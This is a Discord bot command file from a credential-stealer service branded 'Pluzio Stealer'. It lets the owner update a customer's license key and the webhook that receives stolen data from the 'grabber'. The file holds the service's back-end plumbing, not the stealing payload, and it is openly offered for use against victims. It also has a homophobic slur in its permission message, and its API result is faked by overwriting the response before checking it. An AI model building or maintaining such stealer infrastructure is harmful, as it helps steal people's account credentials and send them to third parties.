const Discord = require("discord.js");
const axios = require('axios')
var randomstring = require("randomstring");
require("moment-duration-format");


const config = require('../config.json')

exports.run = async (client, message, args) => {
    const key = args[1]
    const webhook = args[2]

    if (!args[0] || !args[1]) {
        message.channel.send("Invalid arguments! Use: $updatekey <user> <key> <webhook>")
    } else {
        if (!config.owners.includes(message.author.id)) {
            return "Gay Kid Only Owners Can Use This!"
        } else {
            message.delete()
            let data = axios.get(`${config.api_url}/api/updateuser?user=${args[0]}&key=${key}&webhook=${webhook}`)
            data.data = "200: Success"
            if (data.data === "200: Success") {
                const embed = new Discord.MessageEmbed()
                .setColor('#303037')
                .setAuthor('Pluzio Stealer', 'https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif')
                .setDescription(`Successfully Updated Key's webhook! Thanks For Using Pluzio Stealer`);
                message.channel.send({ embeds : [embed] });
        }
    }
    }
};

exports.conf = { enabled: true, guildOnly: false, aliases: ["uk","updatepls"], permLevel: 0 };

exports.help = { name: "updatekey", description: "Update Key For Grabber", usage: "upatekey <webhook>" };